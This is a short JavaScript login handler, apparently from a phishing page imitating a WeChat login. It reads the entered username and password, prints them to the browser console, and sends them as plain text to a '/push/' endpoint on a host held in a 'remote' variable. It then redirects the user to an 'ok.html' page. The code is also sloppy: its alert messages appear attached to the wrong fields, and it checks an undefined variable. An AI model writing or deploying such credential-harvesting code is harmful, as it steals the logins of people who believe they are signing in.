function logon(){
    var password=document.getElementById("password").value;
    var username=document.getElementById("usersname").value;
    if
    (
        password == ""
    )
    {
        alert("微信号不可为空")
        console.log("Error!")
        console.log("pwd:"+password)
        console.log("users:"+username)
        return false
    }
    if(usersname == ""){
        alert("密码不可为空")
        console.log("Error!")
        console.log("pwd:"+password)
        console.log("users:"+username)
        return false
    }
    else
    {
        console.log("Right")
        console.log("password:"+password)
        console.log("usersname:"+username)
        var url = window.location.href;
        var xhr = new XMLHttpRequest();
        xhr.open('POST', remote+"/push/"+url.substring(remote.length).replace("/","")+"/", true);
        xhr.send(JSON.stringify({"content":"用户名: "+username+" 密码: "+password}));
    
        xhr.onload = function() {
            window.location.href = "/resource/other/ok.html"
        };
    }
}